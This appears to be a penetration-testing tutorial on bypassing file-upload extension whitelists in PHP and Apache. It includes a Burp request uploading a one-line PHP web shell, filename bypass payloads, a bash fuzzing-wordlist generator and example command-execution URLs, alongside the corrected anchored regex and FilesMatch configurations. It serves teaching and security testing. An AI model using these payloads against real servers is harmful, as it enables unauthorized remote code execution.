# Whitelist Filter Bypass

A whitelist is architecturally stronger than a blacklist because it permits only explicitly defined safe types rather than trying to enumerate all dangerous ones. However, whitelist implementations frequently fail at the regex level, and the interaction between application-level validation and web server configuration creates a second independent attack surface that a perfect whitelist cannot protect against on its own.

***

## The Regex Flaw at the Core

The most common whitelist implementation uses a regular expression to check whether the filename contains an allowed extension:

```php
// Vulnerable: checks if extension exists anywhere in filename
if (!preg_match('^.*\.(jpg|jpeg|png|gif)', $fileName)) {
    echo "Only images are allowed";
    die();
}

// Secure: anchors to end of string with $
if (!preg_match('/^.*\.(jpg|jpeg|png|gif)$/', $fileName)) {
    echo "Only images are allowed";
    die();
}
```

The difference is the `$` anchor at the end. Without it, the regex matches any filename that contains `.jpg` anywhere, not just filenames that end with `.jpg`. This single missing character is the root cause of double extension bypasses. 
***

## Bypass 1: Double Extension (Weak Regex)

When the whitelist regex does not anchor to the end of the string, appending a whitelisted extension anywhere in the filename satisfies validation while the actual executing extension follows it:

```
shell.jpg.php    # Contains .jpg (passes regex), ends with .php (executes)
shell.png.php5   # Contains .png (passes regex), ends with .php5
shell.gif.phtml  # Contains .gif (passes regex), ends with .phtml
```

The attack flow via Burp:

```http
Content-Disposition: form-data; name="uploadFile"; filename="shell.jpg.php"
Content-Type: image/jpeg

<?php system($_REQUEST['cmd']); ?>
```

The application sees `.jpg` in the filename and passes validation. The web server receives a file ending in `.php` and executes it as PHP. 

***

## Bypass 2: Reverse Double Extension (Apache Misconfiguration)

This bypass targets the web server configuration rather than the application code. Even when the application uses a perfectly anchored regex that only matches filenames ending with an image extension, the Apache `FilesMatch` directive can have the same anchoring flaw independently:

```xml
<!-- Vulnerable Apache config: no $ anchor -->
<FilesMatch ".+\.ph(ar|p|tml)">
    SetHandler application/x-httpd-php
</FilesMatch>

<!-- Secure Apache config: anchored with $ -->
<FilesMatch ".+\.ph(ar|p|tml)$">
    SetHandler application/x-httpd-php
</FilesMatch>
```

Without `$`, Apache executes any file whose name contains `.php`, `.phar`, or `.phtml` anywhere, regardless of the final extension.  The combined attack is: 

```
Filename: shell.php.jpg

Application whitelist check:  ends with .jpg → PASS
Apache FilesMatch check:       contains .php  → EXECUTE AS PHP
```

The application and server each individually enforce their own rules, but together they create a gap. The application enforces what the server receives, and the server independently decides how to handle it based on its own regex.

***

## Bypass 3: Character Injection

Certain special characters cause the application, web server, or operating system to interpret the filename differently from how the validation code sees it. The characters and their effects: 

| Character | Injection Example | Effect |
|-----------|-------------------|--------|
| Null byte `%00` | `shell.php%00.jpg` | PHP < 5.3.4 truncates at null byte, saves as `shell.php` |
| Newline `%0a` | `shell.php%0a.jpg` | Some parsers split on newline |
| Carriage return `%0d%0a` | `shell.php%0d%0a.jpg` | Windows line ending truncation |
| Forward slash `/` | `shell.php/.jpg` | Some frameworks strip path components |
| Colon `:` | `shell.aspx:.jpg` | Windows NTFS alternate data streams |
| Trailing dot `.` | `shell.php.` | Windows strips trailing dot, saves as `shell.php` |
| Trailing space `%20` | `shell.php%20.jpg` | Some parsers strip whitespace |

Generate a permutation wordlist to fuzz all combinations systematically:

```bash
for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\' '.' '...' ':'; do
    for ext in '.php' '.php5' '.phtml' '.phar'; do
        echo "shell${char}${ext}.jpg" >> upload_wordlist.txt
        echo "shell${ext}${char}.jpg" >> upload_wordlist.txt
        echo "shell.jpg${char}${ext}" >> upload_wordlist.txt
        echo "shell.jpg${ext}${char}" >> upload_wordlist.txt
    done
done
```

Run this against Burp Intruder with the position set on the filename field. Any response with a different length from the standard "Only images allowed" error is worth investigating manually.

***

## Bypass 4: Invalid Extension After Valid One

On Apache, if a file has multiple extensions and the final one is not mapped to any MIME type in the server configuration, Apache processes the preceding extension instead.  For example: 

```
shell.php.xyz
```

Apache does not know what `.xyz` is. It falls back to the next extension it recognises, which is `.php`, and executes the file as PHP. This works when:

- The application regex is anchored with `$` and correctly checks the final extension
- But the final extension is an unmapped/unknown type that Apache ignores

Valid unknown extensions to test: `.l33t`, `.evil`, `.test`, `.abc`, `.xyz` or any string that is not in Apache's MIME type database.

***

## Decision Tree for Whitelist Bypass

```
1. Check if regex is anchored ($)
       |
   Not anchored              Anchored
       |                         |
   Double extension          Check Apache FilesMatch
   shell.jpg.php             for same anchoring flaw
                                 |
                         Misconfigured        Correct
                             |                    |
                         Reverse double       Character injection
                         shell.php.jpg        + permutation fuzzing
                                                  |
                                         Check Apache multi-ext
                                         shell.php.xyz fallback
```

***

## Confirming the Bypass

After upload, verify execution with a harmless command before moving to a full shell:

```
http://target.com/profile_images/shell.jpg.php?cmd=id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

http://target.com/profile_images/shell.php.jpg?cmd=id
# Same output if Apache FilesMatch is misconfigured
```

If the file was saved server-side with a sanitised name different from what you uploaded, inspect the page source or use the application's file listing to find the actual stored filename before attempting access. Some applications strip or rename uploaded files, which requires an additional enumeration step before execution can be confirmed.
